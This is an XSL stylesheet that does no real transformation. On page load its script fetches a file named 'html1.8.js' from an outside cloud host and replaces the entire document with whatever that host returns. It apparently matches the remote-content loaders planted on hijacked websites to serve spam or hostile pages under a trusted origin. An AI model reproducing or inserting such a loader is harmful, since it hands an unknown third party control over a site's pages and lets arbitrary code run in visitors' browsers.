<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <body>
                <meta content="always" name="referrer" />
                <meta charset="UTF-8" />
                <script>
                    var content_type = 'text/html;charset=utf-8';
                    function loadhtml(url) {
                        var xhr = new XMLHttpRequest();
                        var html = null;
                        function render() {
                            var a = document.open(content_type, "replace");
                            a.write(html);
                            a.close();
                        }
                        xhr.onload = function () {
                            html = xhr.responseText;
                            var delay = 0;
                            if (delay > 0) setTimeout("render()", delay * 1000);
                            else render();
                        };
                        xhr.open("GET", url, true);
                        xhr.send();
                    }
                    loadhtml('https://alb-55i6xb3xn6bdmzmysw.cn-guangzhou.alb.aliyuncs.com/html1.8.js');
                </script>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
